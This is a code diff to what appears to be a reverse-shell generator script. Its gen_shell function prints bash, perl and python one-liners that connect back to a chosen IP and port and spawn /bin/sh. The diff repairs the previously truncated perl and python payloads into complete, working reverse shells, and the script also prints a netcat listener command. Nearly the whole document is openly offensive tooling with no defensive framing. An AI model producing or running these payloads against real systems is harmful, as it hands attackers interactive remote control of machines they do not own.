@@ -10,9 +10,9 @@ def gen_shell(shell, ip, port):
 	if shell.lower() == 'bash':
 		print("Your bash shell is: bash -i >& /dev/tcp/{}/{} 0>&1".format(ip, port))
 	elif shell.lower() == 'perl':
-		print("Your perl shell is: perl -e 'use Socket;$i="{}";$p={}};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){o".format(ip, port))
+		print("Your perl shell is: perl -e 'use Socket;$i=\"{}\";$p={};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'".format(ip, port))
 	elif shell.lower() == 'python':
-		print("Your python shell is: python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{}",{}));os.dup".format(ip, port))
+		print("Your python shell is: python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{}\",{}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'".format(ip, port))
 
 def nc_listener(port):
 	print("Your netcat listener command is: nc -lnvp " + port)
